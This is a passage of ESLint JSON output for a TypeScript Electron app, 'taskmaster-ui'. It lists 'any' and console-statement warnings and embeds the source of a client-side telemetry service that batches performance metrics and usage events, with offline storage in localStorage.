[]);\n`;","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/lib/services/telemetry.ts","messages":[{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":35,"column":31,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":35,"endColumn":34,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1015,1018],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1015,1018],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":42,"column":31,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":42,"endColumn":34,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1165,1168],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1165,1168],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":181,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":181,"endColumn":18,"suggestions":[{"fix":{"range":[4414,4456],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":216,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":216,"endColumn":18,"suggestions":[{"fix":{"range":[5349,5409],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":218,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":218,"endColumn":20,"suggestions":[{"fix":{"range":[5438,5504],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":246,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":246,"endColumn":18,"suggestions":[{"fix":{"range":[6182,6234],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":280,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":280,"endColumn":18,"suggestions":[{"fix":{"range":[6988,7033],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":321,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":321,"endColumn":19,"suggestions":[{"fix":{"range":[8005,8046],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":358,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":358,"endColumn":18,"suggestions":[{"fix":{"range":[8925,8976],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":398,"column":63,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":398,"endColumn":66,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[9813,9816],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[9813,9816],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":419,"column":33,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":419,"endColumn":36,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[10279,10282],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[10279,10282],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":459,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":459,"endColumn":18,"suggestions":[{"fix":{"range":[11326,11392],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":492,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":492,"endColumn":18,"suggestions":[{"fix":{"range":[12053,12101],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":534,"column":9,"nodeType":"MemberExpression","messageId":"unexpected","endLine":534,"endColumn":21,"suggestions":[{"fix":{"range":[13256,13314],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":605,"column":9,"nodeType":"MemberExpression","messageId":"unexpected","endLine":605,"endColumn":21,"suggestions":[{"fix":{"range":[15692,15749],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":628,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":628,"endColumn":20,"suggestions":[{"fix":{"range":[16479,16532],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":639,"column":47,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":639,"endColumn":50,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[16816,16819],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[16816,16819],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":644,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":644,"endColumn":18,"suggestions":[{"fix":{"range":[17052,17221],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":691,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":691,"endColumn":20,"suggestions":[{"fix":{"range":[18713,18774],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":700,"column":60,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":700,"endColumn":63,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[19027,19030],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[19027,19030],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":701,"column":58,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":701,"endColumn":61,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[19139,19142],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[19139,19142],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":702,"column":64,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":702,"endColumn":67,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[19257,19260],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[19257,19260],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":705,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":705,"endColumn":20,"suggestions":[{"fix":{"range":[19346,19407],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":715,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":715,"endColumn":16,"suggestions":[{"fix":{"range":[19627,19679],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":734,"column":24,"nodeType":"MemberExpression","messageId":"unexpected","endLine":734,"endColumn":37}],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":25,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Production Telemetry Service (2025)\n * \n * Comprehensive telemetry system for performance monitoring and usage analytics\n * following OpenTelemetry patterns with offline-first capabilities.\n * \n * Following 2025 patterns for observability and performance monitoring.\n */\n\nimport { errorReporting } from './errorReporting';\n\n// Telemetry configuration\nexport interface TelemetryConfig {\n  enabled: boolean;\n  apiKey?: string;\n  endpoint?: string;\n  environment: string;\n  sampleRate: number;\n  maxOfflineItems: number;\n  enablePerformanceMetrics: boolean;\n  enableUserInteractionTracking: boolean;\n  enableResourceTracking: boolean;\n  sessionTimeout: number; // milliseconds\n  batchSize: number;\n  flushInterval: number; // milliseconds\n}\n\n// Performance metric types following OpenTelemetry patterns\nexport interface PerformanceMetric {\n  name: string;\n  value: number;\n  unit: 'ms' | 'bytes' | 'percent' | 'count' | 'ratio';\n  timestamp: Date;\n  tags?: Record<string, string>;\n  attributes?: Record<string, any>;\n}\n\n// Usage event for tracking user interactions\nexport interface UsageEvent {\n  name: string;\n  timestamp: Date;\n  properties?: Record<string, any>;\n  user?: {\n    id?: string;\n    sessionId: string;\n  };\n  context?: {\n    page?: string;\n    component?: string;\n    feature?: string;\n  };\n}\n\n// Resource performance data\nexport interface ResourceMetric {\n  name: string;\n  type: 'navigation' | 'resource' | 'measure' | 'paint';\n  startTime: number;\n  duration: number;\n  size?: number;\n  url?: string;\n  timestamp: Date;\n}\n\n// Custom span for tracking operations\nexport interface TelemetrySpan {\n  id: string;\n  name: string;\n  startTime: Date;\n  endTime?: Date;\n  duration?: number;\n  tags: Record<string, string>;\n  status: 'ok' | 'error' | 'timeout';\n  parentId?: string;\n}\n\n/**\n * Circuit breaker for telemetry operations\n */\nclass TelemetryCircuitBreaker {\n  private failureCount = 0;\n  private lastFailureTime = 0;\n  private isOpen = false;\n  \n  constructor(\n    private readonly threshold = 10,\n    private readonly timeout = 120000 // 2 minutes\n  ) {}\n\n  async execute<T>(operation: () => Promise<T>): Promise<T> {\n    if (this.isOpen) {\n      const timeSinceLastFailure = Date.now() - this.lastFailureTime;\n      if (timeSinceLastFailure < this.timeout) {\n        throw new Error('Telemetry circuit breaker is open');\n      }\n      this.isOpen = false;\n    }\n\n    try {\n      const result = await operation();\n      this.onSuccess();\n      return result;\n    } catch (error) {\n      this.onFailure();\n      throw error;\n    }\n  }\n\n  private onSuccess(): void {\n    this.failureCount = 0;\n    this.isOpen = false;\n  }\n\n  private onFailure(): void {\n    this.failureCount++;\n    this.lastFailureTime = Date.now();\n    \n    if (this.failureCount >= this.threshold) {\n      this.isOpen = true;\n    }\n  }\n\n  getState() {\n    return {\n      isOpen: this.isOpen,\n      failureCount: this.failureCount,\n      lastFailureTime: this.lastFailureTime\n    };\n  }\n\n  reset(): void {\n    this.failureCount = 0;\n    this.isOpen = false;\n    this.lastFailureTime = 0;\n  }\n}\n\n/**\n * Production Telemetry Service\n * Implements OpenTelemetry patterns with offline-first capabilities\n */\nexport class TelemetryService {\n  private config: TelemetryConfig = {\n    enabled: false,\n    environment: 'development',\n    sampleRate: 1.0,\n    maxOfflineItems: 500,\n    enablePerformanceMetrics: true,\n    enableUserInteractionTracking: true,\n    enableResourceTracking: true,\n    sessionTimeout: 30 * 60 * 1000, // 30 minutes\n    batchSize: 50,\n    flushInterval: 10000 // 10 seconds\n  };\n\n  private isInitialized = false;\n  private offlineMetrics: PerformanceMetric[] = [];\n  private offlineEvents: UsageEvent[] = [];\n  private offlineResources: ResourceMetric[] = [];\n  private activeSpans = new Map<string, TelemetrySpan>();\n  private circuitBreaker = new TelemetryCircuitBreaker();\n  private sessionId = this.generateSessionId();\n  private sessionStartTime = Date.now();\n  private flushTimer?: NodeJS.Timeout;\n  private isOnline = navigator.onLine;\n  private userId?: string;\n\n  constructor() {\n    this.loadOfflineData();\n    this.setupNetworkListeners();\n    this.setupPerformanceObservers();\n  }\n\n  /**\n   * Initialize telemetry service\n   */\n  async initialize(config: Partial<TelemetryConfig>): Promise<void> {\n    this.config = { ...this.config, ...config };\n    \n    if (!this.config.enabled) {\n      console.log('Telemetry service disabled');\n      return;\n    }\n\n    try {\n      // Initialize telemetry backend\n      if (this.config.apiKey) {\n        await this.initializeTelemetryBackend();\n      }\n\n      this.isInitialized = true;\n      this.startFlushTimer();\n      \n      // Track initialization\n      this.trackEvent({\n        name: 'telemetry_initialized',\n        properties: {\n          environment: this.config.environment,\n          sessionId: this.sessionId,\n          features: {\n            performanceMetrics: this.config.enablePerformanceMetrics,\n            userInteractions: this.config.enableUserInteractionTracking,\n            resourceTracking: this.config.enableResourceTracking\n          }\n        }\n      });\n\n      // Track initial page load metrics\n      this.trackPageLoadMetrics();\n      \n      // Sync offline data if online\n      if (this.isOnline) {\n        await this.syncOfflineData();\n      }\n\n      console.log('âœ… Telemetry service initialized successfully');\n    } catch (error) {\n      console.error('âŒ Failed to initialize telemetry service:', error);\n      errorReporting.reportError(\n        error instanceof Error ? error : new Error(String(error)),\n        {\n          severity: 'warning',\n          tags: { service: 'telemetry', operation: 'initialize' }\n        }\n      );\n    }\n  }\n\n  /**\n   * Track a performance metric\n   */\n  trackPerformance(metric: Omit<PerformanceMetric, 'timestamp'>): void {\n    if (!this.shouldSample()) return;\n\n    const fullMetric: PerformanceMetric = {\n      ...metric,\n      timestamp: new Date(),\n      tags: {\n        sessionId: this.sessionId,\n        environment: this.config.environment,\n        ...metric.tags\n      }\n    };\n\n    if (this.config.environment === 'development') {\n      console.log('[Telemetry] Performance:', fullMetric);\n    }\n\n    if (!this.isOnline || !this.isInitialized) {\n      this.storeMetricOffline(fullMetric);\n      return;\n    }\n\n    // Add to batch for sending\n    this.offlineMetrics.push(fullMetric);\n    this.trimOfflineData();\n  }\n\n  /**\n   * Track a usage event\n   */\n  trackEvent(event: Omit<UsageEvent, 'timestamp' | 'user'>): void {\n    if (!this.shouldSample()) return;\n\n    const fullEvent: UsageEvent = {\n      ...event,\n      timestamp: new Date(),\n      user: {\n        id: this.userId,\n        sessionId: this.sessionId\n      },\n      properties: {\n        sessionAge: Date.now() - this.sessionStartTime,\n        userAgent: navigator.userAgent,\n        ...event.properties\n      }\n    };\n\n    if (this.config.environment === 'development') {\n      console.log('[Telemetry] Event:', fullEvent);\n    }\n\n    if (!this.isOnline || !this.isInitialized) {\n      this.storeEventOffline(fullEvent);\n      return;\n    }\n\n    // Add to batch for sending\n    this.offlineEvents.push(fullEvent);\n    this.trimOfflineData();\n  }\n\n  /**\n   * Start a custom span for operation tracking\n   */\n  startSpan(name: string, tags: Record<string, string> = {}, parentId?: string): string {\n    const spanId = this.generateSpanId();\n    const span: TelemetrySpan = {\n      id: spanId,\n      name,\n      startTime: new Date(),\n      tags: {\n        sessionId: this.sessionId,\n        environment: this.config.environment,\n        ...tags\n      },\n      status: 'ok',\n      parentId\n    };\n\n    this.activeSpans.set(spanId, span);\n    return spanId;\n  }\n\n  /**\n   * Finish a span and track its duration\n   */\n  finishSpan(spanId: string, status: TelemetrySpan['status'] = 'ok', tags: Record<string, string> = {}): void {\n    const span = this.activeSpans.get(spanId);\n    if (!span) {\n      console.warn(`Span ${spanId} not found`);\n      return;\n    }\n\n    span.endTime = new Date();\n    span.duration = span.endTime.getTime() - span.startTime.getTime();\n    span.status = status;\n    span.tags = { ...span.tags, ...tags };\n\n    this.activeSpans.delete(spanId);\n\n    // Track as performance metric\n    this.trackPerformance({\n      name: `span_${span.name}`,\n      value: span.duration,\n      unit: 'ms',\n      tags: {\n        ...span.tags,\n        spanStatus: span.status,\n        spanId: span.id,\n        parentId: span.parentId || 'root'\n      }\n    });\n  }\n\n  /**\n   * Track resource performance\n   */\n  trackResource(resource: Omit<ResourceMetric, 'timestamp'>): void {\n    if (!this.config.enableResourceTracking || !this.shouldSample()) return;\n\n    const fullResource: ResourceMetric = {\n      ...resource,\n      timestamp: new Date()\n    };\n\n    if (this.config.environment === 'development') {\n      console.log('[Telemetry] Resource:', fullResource);\n    }\n\n    if (!this.isOnline || !this.isInitialized) {\n      this.storeResourceOffline(fullResource);\n      return;\n    }\n\n    // Convert to performance metric\n    this.trackPerformance({\n      name: `resource_${resource.type}`,\n      value: resource.duration,\n      unit: 'ms',\n      tags: {\n        resourceName: resource.name,\n        resourceType: resource.type,\n        resourceUrl: resource.url || 'unknown'\n      },\n      attributes: {\n        size: resource.size,\n        startTime: resource.startTime\n      }\n    });\n  }\n\n  /**\n   * Set user context\n   */\n  setUser(userId: string): void {\n    this.userId = userId;\n    \n    this.trackEvent({\n      name: 'user_identified',\n      properties: { userId }\n    });\n  }\n\n  /**\n   * Track page or route navigation\n   */\n  trackPageView(page: string, additionalProps: Record<string, any> = {}): void {\n    this.trackEvent({\n      name: 'page_view',\n      context: { page },\n      properties: {\n        page,\n        timestamp: Date.now(),\n        ...additionalProps\n      }\n    });\n\n    // Reset session timeout\n    this.sessionStartTime = Date.now();\n  }\n\n  /**\n   * Track user interaction\n   */\n  trackInteraction(interaction: {\n    type: 'click' | 'scroll' | 'input' | 'navigation' | 'custom';\n    target: string;\n    properties?: Record<string, any>;\n  }): void {\n    if (!this.config.enableUserInteractionTracking) return;\n\n    this.trackEvent({\n      name: `interaction_${interaction.type}`,\n      context: {\n        component: interaction.target\n      },\n      properties: {\n        interactionType: interaction.type,\n        target: interaction.target,\n        ...interaction.properties\n      }\n    });\n  }\n\n  /**\n   * Get current telemetry status\n   */\n  getStatus() {\n    return {\n      isInitialized: this.isInitialized,\n      isOnline: this.isOnline,\n      sessionId: this.sessionId,\n      userId: this.userId,\n      offlineMetricsCount: this.offlineMetrics.length,\n      offlineEventsCount: this.offlineEvents.length,\n      offlineResourcesCount: this.offlineResources.length,\n      activeSpansCount: this.activeSpans.size,\n      circuitBreakerState: this.circuitBreaker.getState(),\n      sessionAge: Date.now() - this.sessionStartTime\n    };\n  }\n\n  /**\n   * Manually flush telemetry data\n   */\n  async flush(): Promise<void> {\n    if (!this.isOnline || !this.isInitialized) {\n      console.log('Cannot flush telemetry: offline or not initialized');\n      return;\n    }\n\n    await this.sendBatchData();\n  }\n\n  /**\n   * Export offline data for debugging\n   */\n  exportOfflineData() {\n    return {\n      metrics: [...this.offlineMetrics],\n      events: [...this.offlineEvents],\n      resources: [...this.offlineResources]\n    };\n  }\n\n  /**\n   * Clear offline data\n   */\n  clearOfflineData(): void {\n    this.offlineMetrics = [];\n    this.offlineEvents = [];\n    this.offlineResources = [];\n    this.saveOfflineData();\n  }\n\n  // Private methods\n\n  private async initializeTelemetryBackend(): Promise<void> {\n    // This would integrate with Application Insights, Datadog, etc.\n    if (this.config.apiKey) {\n      console.log('ðŸ”„ Telemetry backend initialized');\n    }\n  }\n\n  private shouldSample(): boolean {\n    return Math.random() < this.config.sampleRate;\n  }\n\n  private setupNetworkListeners(): void {\n    window.addEventListener('online', () => {\n      this.isOnline = true;\n      this.trackEvent({\n        name: 'network_online',\n        properties: { previouslyOffline: true }\n      });\n      this.syncOfflineData();\n    });\n\n    window.addEventListener('offline', () => {\n      this.isOnline = false;\n      this.trackEvent({\n        name: 'network_offline',\n        properties: { hadConnection: true }\n      });\n    });\n  }\n\n  private setupPerformanceObservers(): void {\n    if (!this.config.enablePerformanceMetrics) return;\n\n    // Observe navigation timing\n    if ('performance' in window && 'getEntriesByType' in performance) {\n      // Use PerformanceObserver for real-time metrics\n      try {\n        const observer = new PerformanceObserver((list) => {\n          list.getEntries().forEach((entry) => {\n            this.processPerformanceEntry(entry);\n          });\n        });\n\n        observer.observe({ entryTypes: ['navigation', 'resource', 'measure', 'paint'] });\n      } catch (error) {\n        console.warn('PerformanceObserver not supported:', error);\n      }\n    }\n\n    // Track page load metrics on window load\n    if (document.readyState === 'loading') {\n      window.addEventListener('load', () => {\n        setTimeout(() => this.trackPageLoadMetrics(), 0);\n      });\n    } else {\n      setTimeout(() => this.trackPageLoadMetrics(), 0);\n    }\n  }\n\n  private processPerformanceEntry(entry: PerformanceEntry): void {\n    if (entry.entryType === 'navigation') {\n      const navEntry = entry as PerformanceNavigationTiming;\n      this.trackNavigationMetrics(navEntry);\n    } else if (entry.entryType === 'resource') {\n      const resEntry = entry as PerformanceResourceTiming;\n      this.trackResource({\n        name: resEntry.name.split('/').pop() || 'unknown',\n        type: 'resource',\n        startTime: resEntry.startTime,\n        duration: resEntry.duration,\n        size: resEntry.transferSize,\n        url: resEntry.name\n      });\n    } else if (entry.entryType === 'paint') {\n      this.trackPerformance({\n        name: entry.name.replace('-', '_'),\n        value: entry.startTime,\n        unit: 'ms',\n        tags: { type: 'paint' }\n      });\n    }\n  }\n\n  private trackNavigationMetrics(navEntry: PerformanceNavigationTiming): void {\n    const metrics = [\n      { name: 'page_load_time', value: navEntry.loadEventEnd - navEntry.startTime },\n      { name: 'dom_content_loaded', value: navEntry.domContentLoadedEventEnd - navEntry.startTime },\n      { name: 'first_byte', value: navEntry.responseStart - navEntry.requestStart },\n      { name: 'dom_processing', value: navEntry.domComplete - navEntry.domLoading },\n      { name: 'resource_load', value: navEntry.loadEventStart - navEntry.domContentLoadedEventEnd }\n    ];\n\n    metrics.forEach(metric => {\n      if (metric.value > 0) {\n        this.trackPerformance({\n          name: metric.name,\n          value: metric.value,\n          unit: 'ms',\n          tags: { type: 'navigation' }\n        });\n      }\n    });\n  }\n\n  private trackPageLoadMetrics(): void {\n    if ('performance' in window && 'getEntriesByType' in performance) {\n      const navEntries = performance.getEntriesByType('navigation') as PerformanceNavigationTiming[];\n      if (navEntries.length > 0) {\n        this.trackNavigationMetrics(navEntries[0]);\n      }\n    }\n  }\n\n  private startFlushTimer(): void {\n    this.flushTimer = setInterval(() => {\n      this.sendBatchData().catch(error => {\n        console.warn('Scheduled telemetry flush failed:', error);\n      });\n    }, this.config.flushInterval);\n  }\n\n  private async sendBatchData(): Promise<void> {\n    if (this.offlineMetrics.length === 0 && this.offlineEvents.length === 0 && this.offlineResources.length === 0) {\n      return;\n    }\n\n    try {\n      await this.circuitBreaker.execute(async () => {\n        const batch = {\n          metrics: this.offlineMetrics.splice(0, this.config.batchSize),\n          events: this.offlineEvents.splice(0, this.config.batchSize),\n          resources: this.offlineResources.splice(0, this.config.batchSize),\n          sessionId: this.sessionId,\n          timestamp: new Date().toISOString()\n        };\n\n        await this.sendToTelemetryBackend(batch);\n      });\n    } catch (error) {\n      console.error('Telemetry batch send failed:', error);\n      errorReporting.reportError(\n        error instanceof Error ? error : new Error(String(error)),\n        {\n          severity: 'warning',\n          tags: { service: 'telemetry', operation: 'sendBatch' }\n        }\n      );\n    }\n  }\n\n  private async sendToTelemetryBackend(batch: any): Promise<void> {\n    // This would send to your telemetry backend\n    if (this.config.endpoint && this.config.apiKey) {\n      // Simulate API call\n      await new Promise(resolve => setTimeout(resolve, Math.random() * 100));\n      console.log('ðŸ“Š Telemetry batch sent:', {\n        metrics: batch.metrics.length,\n        events: batch.events.length,\n        resources: batch.resources.length\n      });\n    }\n  }\n\n  private storeMetricOffline(metric: PerformanceMetric): void {\n    this.offlineMetrics.push(metric);\n    this.trimOfflineData();\n    this.saveOfflineData();\n  }\n\n  private storeEventOffline(event: UsageEvent): void {\n    this.offlineEvents.push(event);\n    this.trimOfflineData();\n    this.saveOfflineData();\n  }\n\n  private storeResourceOffline(resource: ResourceMetric): void {\n    this.offlineResources.push(resource);\n    this.trimOfflineData();\n    this.saveOfflineData();\n  }\n\n  private trimOfflineData(): void {\n    if (this.offlineMetrics.length > this.config.maxOfflineItems) {\n      this.offlineMetrics = this.offlineMetrics.slice(-this.config.maxOfflineItems);\n    }\n    if (this.offlineEvents.length > this.config.maxOfflineItems) {\n      this.offlineEvents = this.offlineEvents.slice(-this.config.maxOfflineItems);\n    }\n    if (this.offlineResources.length > this.config.maxOfflineItems) {\n      this.offlineResources = this.offlineResources.slice(-this.config.maxOfflineItems);\n    }\n  }\n\n  private saveOfflineData(): void {\n    try {\n      const data = {\n        metrics: this.offlineMetrics.map(m => ({ ...m, timestamp: m.timestamp.toISOString() })),\n        events: this.offlineEvents.map(e => ({ ...e, timestamp: e.timestamp.toISOString() })),\n        resources: this.offlineResources.map(r => ({ ...r, timestamp: r.timestamp.toISOString() }))\n      };\n      localStorage.setItem('taskmaster_telemetry_offline', JSON.stringify(data));\n    } catch (err) {\n      console.error('Failed to save offline telemetry data:', err);\n    }\n  }\n\n  private loadOfflineData(): void {\n    try {\n      const stored = localStorage.getItem('taskmaster_telemetry_offline');\n      if (stored) {\n        const data = JSON.parse(stored);\n        this.offlineMetrics = (data.metrics || []).map((m: any) => ({ ...m, timestamp: new Date(m.timestamp) }));\n        this.offlineEvents = (data.events || []).map((e: any) => ({ ...e, timestamp: new Date(e.timestamp) }));\n        this.offlineResources = (data.resources || []).map((r: any) => ({ ...r, timestamp: new Date(r.timestamp) }));\n      }\n    } catch (err) {\n      console.error('Failed to load offline telemetry data:', err);\n      this.offlineMetrics = [];\n      this.offlineEvents = [];\n      this.offlineResources = [];\n    }\n  }\n\n  private async syncOfflineData(): Promise<void> {\n    if (!this.isOnline || !this.isInitialized) return;\n\n    console.log(`ðŸ”„ Syncing offline telemetry data...`);\n    await this.sendBatchData();\n  }\n\n  private generateSpanId(): string {\n    return `span_${Date.now()}_${Math.random().toString(36).substring(2)}`;\n  }\n\n  private generateSessionId(): string {\n    return `session_${Date.now()}_${Math.random().toString(36).substring(2)}`;\n  }\n\n  /**\n   * Cleanup method\n   */\n  destroy(): void {\n    if (this.flushTimer) {\n      clearInterval(this.flushTimer);\n    }\n    this.flush().catch(console.error);\n    this.saveOfflineData();\n  }\n}\n\n// Global instance\nexport const telemetry = new TelemetryService();\n\n// Type is already exported with its declaration","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/lib/utils.ts","messages":[{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":140,"column":53,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":140,"endColumn":56,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[4271,4274],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[4271,4274],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":157,"column":17,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":157,"endColumn":20,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[4896,4899],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[4896,4899],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":158,"column":17,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":158,"endColumn":20,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[4942,4945],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[4942,4945],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":177,"column":46,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":177,"endColumn":49,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[5471,5474],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[5471,5474],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":177,"column":56,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":177,"endColumn":59,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[5481,5484],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[5481,5484],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different 